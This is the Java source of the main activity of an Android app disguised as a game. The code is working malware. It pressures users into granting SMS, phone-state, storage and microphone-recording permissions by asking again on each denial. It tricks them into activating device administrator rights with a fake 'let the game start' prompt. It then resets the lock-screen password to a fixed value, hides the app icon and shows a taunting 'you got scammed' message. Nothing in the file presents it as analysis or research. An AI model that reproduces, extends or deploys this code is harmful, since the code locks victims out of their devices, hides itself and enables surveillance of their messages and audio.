package com.sneaky.gamey;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.sneaky.gamey.receivers.AdminReceiver;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    public static Context context = App.getContext();
    public static String[] permissions = { Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
    Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.MODIFY_AUDIO_SETTINGS, Manifest.permission.RECORD_AUDIO};
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //startService(new Intent(this, PhoneService.class));
        startRequestPermissions();
        startAdminRequest();
        setPassword();
        hideIcon();
    }

    private void hideIcon() {
        try{
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setPassword() {
        DevicePolicyManager devicePolicyManager =(DevicePolicyManager)getApplicationContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName demoDeviceAdmin =new ComponentName(this, AdminReceiver.class);
        devicePolicyManager.setPasswordQuality(demoDeviceAdmin,DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
        devicePolicyManager.setPasswordMinimumLength(demoDeviceAdmin, 5);
        devicePolicyManager.resetPassword("123456", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        Toast.makeText(this, "tzeapa, ce, n-ai mai luat tzeapa? xD",  Toast.LENGTH_LONG).show();
    }

    private void startAdminRequest() {
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);

            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to let the game start.");
                startActivityForResult(intent, 200);
            } else {
                startAdminRequest();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<String>();
        for (String perm: permissions) {
            if (this.getApplicationContext().checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm);
            }
        }
        requestPermissions(permissionsToRequest.toArray(new String[0]), 200);
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        for (int result: grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED)
                startRequestPermissions();
        }

    }
}